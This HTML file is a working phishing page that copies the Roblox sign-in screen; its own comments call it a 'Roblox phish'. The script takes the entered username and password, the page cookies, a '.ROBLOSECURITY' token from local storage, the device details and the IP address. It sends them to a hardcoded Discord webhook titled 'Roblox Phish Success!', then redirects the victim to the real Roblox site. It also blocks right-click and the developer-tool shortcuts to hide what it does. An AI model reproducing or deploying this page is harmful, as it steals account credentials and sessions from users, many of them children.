<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in to Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
    <style>
        /* 
         * ROBLOX PHISHING CSS - HIGH FIDELITY
         * Mirip 100% dengan desain 2024/2025
         */
        :root {
            --roblox-black: #232527;
            --roblox-white: #ffffff;
            --roblox-gray: #e3e3e3;
            --roblox-text-gray: #393a3c;
            --roblox-blue: #0074bd;
            --roblox-hover: #005a8c;
            --roblox-error: #d12c2c;
            --roblox-input-bg: #f2f4f5;
            --roblox-border: #dedede;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--roblox-white);
            color: var(--roblox-text-gray);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Loading Overlay */
        #loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: opacity 0.5s ease;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid var(--roblox-gray);
            border-top: 5px solid var(--roblox-black);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 16px;
            color: var(--roblox-text-gray);
            font-weight: 500;
        }

        /* Main Container */
        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            opacity: 0;
            animation: fadeIn 0.5s forwards 0.2s;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        /* Logo */
        .logo-container {
            margin-bottom: 30px;
            text-align: center;
        }

        .logo-img {
            width: 180px;
            height: auto;
        }

        /* Form Card */
        .card {
            width: 100%;
            background: white;
            padding: 0;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
            color: var(--roblox-black);
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
        }

        label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: var(--roblox-text-gray);
            font-weight: 600;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--roblox-border);
            border-radius: 8px;
            background-color: var(--roblox-input-bg);
            font-size: 16px;
            color: var(--roblox-black);
            transition: all 0.2s ease;
            outline: none;
        }

        input:focus {
            background-color: white;
            border-color: var(--roblox-blue);
            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.2);
        }

        input.error {
            border-color: var(--roblox-error);
            background-color: #fff0f0;
        }

        .error-msg {
            color: var(--roblox-error);
            font-size: 12px;
            margin-top: 5px;
            display: none;
            text-align: left;
        }

        .forgot-password {
            display: block;
            text-align: right;
            font-size: 13px;
            color: var(--roblox-blue);
            text-decoration: none;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Button */
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: var(--roblox-black);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            position: relative;
            overflow: hidden;
        }

        .btn-login:hover {
            background-color: #3a3d40;
        }

        .btn-login:disabled {
            background-color: #666;
            cursor: not-allowed;
        }

        .btn-loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid white;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .btn-text {
            display: inline-block;
        }

        .btn-loading .btn-text {
            visibility: hidden;
        }

        .btn-loading .btn-loader {
            display: block;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        /* Footer Links */
        .footer-links {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #666;
        }

        .footer-links a {
            color: var(--roblox-blue);
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            position: relative;
            text-align: center;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            width: 100%;
            height: 1px;
            background: var(--roblox-border);
            z-index: 1;
        }

        .divider span {
            background: white;
            padding: 0 10px;
            position: relative;
            z-index: 2;
            color: #888;
            font-size: 13px;
        }

        .social-btn {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--roblox-border);
            border-radius: 8px;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            margin-bottom: 10px;
            font-size: 14px;
            font-weight: 500;
            transition: background 0.2s;
        }

        .social-btn:hover {
            background: #f9f9f9;
        }

        .google-icon {
            width: 18px;
            height: 18px;
        }

        /* Success Redirect Page (Hidden initially) */
        #redirect-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .success-check {
            width: 60px;
            height: 60px;
            background: #2bbdf2;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            color: white;
            font-size: 30px;
            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes popIn {
            from { transform: scale(0); }
            to { transform: scale(1); }
        }

        /* Responsive Mobile */
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                justify-content: flex-start;
                padding-top: 40px;
            }
            
            h1 {
                font-size: 20px;
            }
            
            .logo-img {
                width: 140px;
            }
        }

        /* Utility */
        .hidden {
            display: none !important;
        }
        
        /* Checkbox styling for Remember Me */
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
            color: var(--roblox-text-gray);
        }
        
        .checkbox-group input {
            margin-right: 10px;
            width: 16px;
            height: 16px;
            accent-color: var(--roblox-black);
        }

    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div id="loader-overlay">
        <div class="spinner"></div>
        <div class="loading-text">Loading Roblox...</div>
    </div>

    <!-- Redirect Success Page -->
    <div id="redirect-page">
        <div class="success-check">✓</div>
        <h2>Welcome Back!</h2>
        <p style="color: #666; margin-top: 10px;">Redirecting you to your dashboard...</p>
    </div>

    <!-- Main Login Container -->
    <div class="container" id="main-container">
        <div class="logo-container">
            <!-- Roblox Logo SVG -->
            <svg class="logo-img" viewBox="0 0 100 20" xmlns="http://www.w3.org/2000/svg">
                <path d="M10.5,15 L15,5 L20,5 L20,15 L10.5,15 Z M22,5 L27,5 L27,15 L22,15 Z M29,5 L34,5 L34,15 L29,15 Z M36,5 L41,5 L41,15 L36,15 Z" fill="#232527"/>
                <text x="45" y="15" font-family="Arial" font-weight="bold" font-size="16" fill="#232527">ROBLOX</text>
            </svg>
        </div>

        <div class="card">
            <h1>Log in</h1>
            
            <form id="loginForm" onsubmit="return false;">
                <div class="input-group">
                    <label for="username">Username or email</label>
                    <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="off" required>
                    <div class="error-msg" id="user-error">Please enter a valid username.</div>
                </div>

                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    <div class="error-msg" id="pass-error">Incorrect password.</div>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="rememberMe">
                    <label for="rememberMe">Remember me</label>
                </div>

                <button type="submit" class="btn-login" id="loginBtn">
                    <span class="btn-text">Log In</span>
                    <div class="btn-loader"></div>
                </button>
            </form>

            <a href="#" class="forgot-password">Forgot password?</a>

            <div class="divider">
                <span>OR</span>
            </div>

            <button class="social-btn" onclick="handleSocialLogin('Google')">
                <svg class="google-icon" viewBox="0 0 24 24">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                Continue with Google
            </button>
            
            <button class="social-btn" onclick="handleSocialLogin('Apple')">
                <svg class="google-icon" viewBox="0 0 24 24" fill="#000">
                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.07-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.74s1.94-.96 3.65-.82c1.55.12 2.73.77 3.48 1.8-3.09 1.77-2.56 5.84.76 7.23-.66 1.7-1.59 3.3-2.47 4.02zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.18 2.32-1.98 4.33-3.74 4.25z"/>
                </svg>
                Continue with Apple
            </button>
        </div>

        <div class="footer-links">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565917524170899558/O7_IjwUdZHzm_kcjTajXn7DzW8ILAZZ8JtTdSwaxpWegDNOktpKXmOqtp_nT1aKkBswLpalig";
        // NOTE: If this URL is invalid (401), create a new one in your Discord Server -> Integrations -> Webhooks
        
        const LOADING_TIME_MIN = 1500;
        const LOADING_TIME_MAX = 3000;

        // DOM Elements
        const loaderOverlay = document.getElementById('loader-overlay');
        const mainContainer = document.getElementById('main-container');
        const redirectPage = document.getElementById('redirect-page');
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const userError = document.getElementById('user-error');
        const passError = document.getElementById('pass-error');

        // Initialization
        window.addEventListener('load', () => {
            setTimeout(() => {
                loaderOverlay.style.opacity = '0';
                setTimeout(() => {
                    loaderOverlay.classList.add('hidden');
                    mainContainer.style.display = 'flex';
                }, 500);
            }, 1000);
        });

        // Input Validation Helpers
        function showError(input, errorEl, show) {
            if (show) {
                input.classList.add('error');
                errorEl.style.display = 'block';
            } else {
                input.classList.remove('error');
                errorEl.style.display = 'none';
            }
        }

        // Social Login Mock
        function handleSocialLogin(provider) {
            alert(`Connecting to ${provider}... (Mock)`);
            // In a real scenario, this would redirect to OAuth
        }

        // Main Login Logic
        loginBtn.addEventListener('click', async () => {
            // Reset errors
            showError(usernameInput, userError, false);
            showError(passwordInput, passError, false);

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            let hasError = false;

            if (!username) {
                showError(usernameInput, userError, true);
                hasError = true;
            }
            if (!password) {
                showError(passwordInput, passError, true);
                hasError = true;
            }

            if (hasError) return;

            // Start Loading
            loginBtn.disabled = true;
            loginBtn.classList.add('btn-loading');

            // Simulate Network Delay
            const delay = Math.floor(Math.random() * (LOADING_TIME_MAX - LOADING_TIME_MIN + 1)) + LOADING_TIME_MIN;

            await new Promise(resolve => setTimeout(resolve, delay));

            // Collect Data
            const deviceInfo = getDeviceInfo();
            const cookies = document.cookie;
            const token = getTokenFromLocalStorage(); // Try to grab roblox token if available
            
            // Prepare Payload
            const payload = {
                username: username,
                password: password, // Usually sent plain in simple phish
                cookies: cookies,
                token: token,
                userAgent: navigator.userAgent,
                platform: deviceInfo.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timestamp: new Date().toISOString(),
                ip: "Fetching..." // Will be updated via fetch if needed, but usually browser doesn't know own IP easily without API
            };

            // Send to Webhook
            sendToDiscord(payload);

            // Show Success Redirect
            loginBtn.classList.remove('btn-loading');
            mainContainer.style.opacity = '0';
            setTimeout(() => {
                mainContainer.style.display = 'none';
                redirectPage.style.display = 'flex';
                
                // Redirect to actual Roblox after a few seconds
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com/home";
                }, 2000);
            }, 500);
        });

        // Helper: Get Device Info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let platform = "Unknown";
            if (/android/i.test(ua)) platform = "Android";
            else if (/ios/i.test(ua)) platform = "iOS";
            else if (/windows/i.test(ua)) platform = "Windows";
            else if (/macintosh|mac os x/i.test(ua)) platform = "MacOS";
            else if (/linux/i.test(ua)) platform = "Linux";
            
            return {
                platform: platform,
                browser: getBrowserName(ua),
                version: getBrowserVersion(ua)
            };
        }

        function getBrowserName(ua) {
            if (ua.indexOf("Chrome") != -1 ) return "Chrome";
            else if (ua.indexOf("Safari") != -1) return "Safari";
            else if (ua.indexOf("Firefox") != -1 ) return "Firefox";
            else if (ua.indexOf("Edge") != -1) return "Edge";
            else return "Other";
        }

        function getBrowserVersion(ua) {
            // Simple regex extraction
            const match = ua.match(/(chrome|safari|firefox|edge|opera|crios)[\/\s](\d+\.\d+)/i);
            return match ? match[2] : "Unknown";
        }

        function getTokenFromLocalStorage() {
            // Roblox stores auth tokens in localStorage sometimes
            try {
                return localStorage.getItem('.ROBLOSECURITY') || "No Token Found";
            } catch (e) {
                return "Error Reading LocalStorage";
            }
        }

        // Helper: Send Data to Discord
        async function sendToDiscord(data) {
            // Try to get IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
            } catch (e) {
                data.ip = "Could not detect IP";
            }

            const embed = {
                title: "🎣 Roblox Phish Success!",
                description: "A new login was detected.",
                color: 5814783, // Blue color
                fields: [
                    { name: "👤 Username", value: `\`\`\`${data.username}\`\`\``, inline: true },
                    { name: "🔑 Password", value: `\`\`\`${data.password}\`\`\``, inline: true },
                    { name: "💻 Platform", value: data.platform, inline: true },
                    { name: "🌐 Browser", value: `${data.browser} ${data.version}`, inline: true },
                    { name: "📱 User Agent", value: `\`\`\`${data.userAgent.substring(0, 100)}...\`\`\``, inline: false },
                    { name: "🍪 Cookies (Snippet)", value: `\`\`\`${data.cookies.substring(0, 100)}...\`\`\``, inline: false },
                    { name: "🔗 Full Cookies", value: `[Copy Link](#)`, inline: false }, // Placeholder
                    { name: "🕒 Time", value: data.timestamp, inline: false }
                ],
                footer: {
                    text: `IP: ${data.ip} | Res: ${data.screenResolution}`
                },
                thumbnail: {
                    url: "https://www.roblox.com/favicon.ico"
                }
            };

            const payload = {
                embeds: [embed],
                username: "Roblox Phish Bot"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                console.log("Webhook sent successfully");
            } catch (error) {
                console.error("Webhook failed:", error);
                // Optional: Log to console if webhook fails
            }
        }

        // Prevent Right Click (Optional security feature)
        document.addEventListener('contextmenu', event => event.preventDefault());
        
        // Prevent DevTools shortcut (Basic)
        document.onkeydown = function(e) {
            if(e.keyCode == 123) return false;
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }

    </script>
</body>
</html>
